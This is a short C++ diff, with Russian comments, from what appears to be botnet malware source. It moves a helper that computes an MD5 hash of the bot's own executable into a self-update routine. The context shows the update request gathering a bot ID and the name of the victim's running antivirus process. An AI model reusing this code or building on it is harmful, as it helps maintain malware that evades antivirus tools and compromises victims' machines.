@@ -51,6 +51,25 @@ void TBotUpdater::DoExecute()
 }
 //----------------------------------------------------------
 
+
+//----------------------------------------------------
+//  BotExeMD5 - Функция возвращает MD5 хэш ехе бота
+//----------------------------------------------------
+string BotExeMD5()
+{
+	string FileName = BOT::GetBotFullExeName();
+
+	string Result = CalcFileMD5Hash(FileName.t_str());
+
+	if (Result.IsEmpty())
+	{
+		Result.SetLength(32);
+		m_memset(Result.t_str(), '0', 32);
+    }
+	return Result;
+}
+
+
 void TBotUpdater::Update(DWORD &UpdateInterval)
 {
 	// Функция выполняет автоматическое обновление бота
@@ -69,7 +88,7 @@ void TBotUpdater::Update(DWORD &UpdateInterval)
 	// Выполняем запрос
 	string UID = GenerateBotID2();
 	string AV  = GetAntiVirusProcessName();
-	string MD5 = BOT::BotExeMD5();
+	string MD5 = BotExeMD5();
 
 
 	TBotStrings Fields;
